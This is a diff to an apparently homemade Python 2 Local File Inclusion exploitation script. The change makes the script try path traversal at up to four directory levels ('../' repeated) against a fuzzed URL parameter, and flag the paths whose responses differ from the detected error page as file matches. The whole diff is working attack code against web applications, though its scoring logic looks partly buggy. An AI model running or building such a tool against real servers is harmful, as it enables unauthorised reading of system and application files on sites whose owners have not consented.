@@ -93,26 +93,36 @@ def LFI_error_tester(url, tests, tolerance):
         for j in error:
             if SequenceMatcher(None, i, j).ratio() > tolerance:
                 validity += SequenceMatcher(None, i, j).ratio()
+
         best.append((i, validity/len(tests)))
 
-    max_score = max([n[1] for n in best])
-    error = [i for i in best if i[1] == max_score][0][0]
-    return error
+    min_score = min([n[1] for n in best])
+    error = [i for i in best if i[1] == min_score][0][0]
+    return (error, validity)
 
-def LFI_exploiter(url, error, paths):
+def LFI_exploiter(url, error, paths, validity, levels=1):
 
     matches = 0
 
     try:
-        for i in paths:
-            content = requests.get(url+i).content.strip()
-            if SequenceMatcher(None, content, error).ratio() < 50:
-                Print("==> Match found with {}".format(url+i))
-                matches += 1
+        for x in range(0,levels):
+            urli = url + "../"*x
+            Print("Trying level {}...".format(str(x)))
+            for i in paths:
+                url_use = (urli+i).replace("..//", "../")
+                content = requests.get(url_use).content.strip()
+
+                # IMPROVE WAY OF CHECKING WHETHER ERROR OR FILE
+
+                if SequenceMatcher(None, content, error).ratio() < validity and abs(len(error) - len(content)) > 50:
+                    Print("==> Match found with {}".format(url_use))
+                    matches += 1
     
     except KeyboardInterrupt:
         print "\r[*] Aborting, {} matches found.".format(matches)
         return 1
+
+    Print("Finished, {} matches found.".format(matches))
 
 def urlparse(url, value):
     base = url.split("?")[0]
@@ -191,15 +201,17 @@ if __name__ == "__main__":
         tests = getRubbish()
         tolerance = 0.75
         value = "file" # rewrite so that it's in arguments
+        levels = 4 # rewrite in args
 
         url = urlparse(url, value) # rearranges url so that fuzzed parameter is last & empty
 
-        error = LFI_error_tester(url, tests, tolerance)
+        error, validity = LFI_error_tester(url, tests, tolerance)
 
         Print("Error message detected, lenght = {}.".format(len(error)))
         #Print(error)
         Print("Starting exploitation...")
-        LFI_exploiter(url, error, paths)
+
+        LFI_exploiter(url, error, paths, validity, levels)
 
     if args.__dict__["out_file"] != "": 
 
